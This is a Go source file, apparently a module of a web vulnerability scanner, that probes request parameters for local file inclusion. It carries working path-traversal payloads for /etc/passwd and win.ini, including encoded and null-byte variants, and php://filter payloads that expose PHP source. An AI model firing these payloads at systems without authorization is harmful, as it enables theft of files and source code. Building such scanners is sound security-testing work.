package modules

import (
	"encoding/base64"
	"fmt"
	"nightfalllx/pkg/client"
	"regexp"
	"strings"
)

type LFIModule struct{}

func NewLFIModule() *LFIModule {
	return &LFIModule{}
}

func (m *LFIModule) Name() string {
	return "lfi"
}

func (m *LFIModule) Description() string {
	return "Local File Inclusion and Path Traversal verification"
}

var (
	rootPasswdRegex = regexp.MustCompile(`root:[^:]*?:0:0:`)
	winIniRegex     = regexp.MustCompile(`(?i)\[(?:fonts|extensions)\]`)
	base64BlobRegex = regexp.MustCompile(`(?:[A-Za-z0-9+/]{4}){4,}(?:[A-Za-z0-9+/]{2}==|[A-Za-z0-9+/]{3}=)?`)
)

var traversalPayloads = []struct {
	Payload string
	Regex   *regexp.Regexp
}{
	{"../../../../etc/passwd", rootPasswdRegex},
	{"../../../../../../../../etc/passwd", rootPasswdRegex},
	{"../../../../../../../../../../etc/passwd", rootPasswdRegex},
	{"../../../../../../../../etc/passwd%00", rootPasswdRegex},
	{"..%2f..%2f..%2f..%2fetc%2fpasswd", rootPasswdRegex},
	{"..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd", rootPasswdRegex},
	{"..%252f..%252f..%252f..%252fetc%252fpasswd", rootPasswdRegex},
	{"....//....//....//etc/passwd", rootPasswdRegex},
	{"....//....//....//....//....//....//etc/passwd", rootPasswdRegex},
	{"/etc/passwd", rootPasswdRegex},
	{"../../../../windows/win.ini", winIniRegex},
	{"../../../../../../../../windows/win.ini", winIniRegex},
	{"..\\..\\..\\..\\windows\\win.ini", winIniRegex},
	{"..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini", winIniRegex},
}

func (m *LFIModule) Run(target *Target, c *client.Client) ([]*Finding, error) {
	var findings []*Finding
	isPost := strings.ToUpper(target.Method) == "POST"

	headers := map[string]string{}
	if target.IsJSON {
		headers["Content-Type"] = "application/json"
	}

	for _, param := range target.Parameters() {
		// 1. PHP Filter checks (both with and without .php for appended extensions)
		phpFilters := []string{
			"php://filter/convert.base64-encode/resource=index.php",
			"php://filter/convert.base64-encode/resource=index",
			"php://filter/read=convert.base64-encode/resource=index.php",
			"php://filter/read=convert.base64-encode/resource=index",
		}
		for _, phpFilterPayload := range phpFilters {
			var filterResp *client.Response
			var err error
			if isPost {
				filterResp, err = c.Request("POST", target.URL, target.BuildBodyWithParam(param, phpFilterPayload), headers)
			} else {
				filterResp, err = c.Request("GET", target.BuildURLWithParam(param, phpFilterPayload), "", nil)
			}

			if err == nil && filterResp != nil && filterResp.Body != "" {
				blobs := base64BlobRegex.FindAllString(filterResp.Body, -1)
				for _, blob := range blobs {
					padded := blob + strings.Repeat("=", (4-len(blob)%4)%4)
					decoded, decErr := base64.StdEncoding.DecodeString(padded)
					if decErr == nil && (strings.Contains(string(decoded), "<?php") || strings.Contains(string(decoded), "<?=")) {
						f := &Finding{
							Module:      m.Name(),
							Title:       "Local File Inclusion (PHP Stream Filter)",
							Severity:    SeverityHigh,
							URL:         target.URL,
							Parameter:   param,
							Payload:     phpFilterPayload,
							Detail:      "PHP source code disclosure confirmed via php://filter base64 stream wrapper.",
							Evidence:    "Decoded base64 stream contained PHP script markers (<?php).",
							Remediation: "Disable PHP stream wrappers in user-controlled file inclusion and validate against an allow-list.",
							CWEID:       98,
						}
						f.SetConfidence(ConfidenceConfirmed)
						findings = append(findings, f)
						break
					}
				}
			}
		}

		if len(findings) > 0 {
			continue
		}

		// 2. Path Traversal checks
		for _, item := range traversalPayloads {
			var resp *client.Response
			var err error
			if isPost {
				resp, err = c.Request("POST", target.URL, target.BuildBodyWithParam(param, item.Payload), headers)
			} else {
				resp, err = c.Request("GET", target.BuildURLWithParam(param, item.Payload), "", nil)
			}
			if err != nil || resp == nil || resp.Body == "" {
				continue
			}

			if item.Regex.MatchString(resp.Body) {
				f := &Finding{
					Module:      m.Name(),
					Title:       "Path Traversal / Local File Inclusion (LFI)",
					Severity:    SeverityHigh,
					URL:         target.URL,
					Parameter:   param,
					Payload:     item.Payload,
					Detail:      fmt.Sprintf("Arbitrary file read confirmed: disclosed known operating system file via payload '%s'.", item.Payload),
					Evidence:    fmt.Sprintf("Matched pattern in response for %s", item.Payload),
					Remediation: "Sanitize file paths, avoid passing raw user input into file systems, and restrict permissions.",
					CWEID:       22,
				}
				f.SetConfidence(ConfidenceConfirmed)
				findings = append(findings, f)
				break
			}
		}
	}

	return findings, nil
}
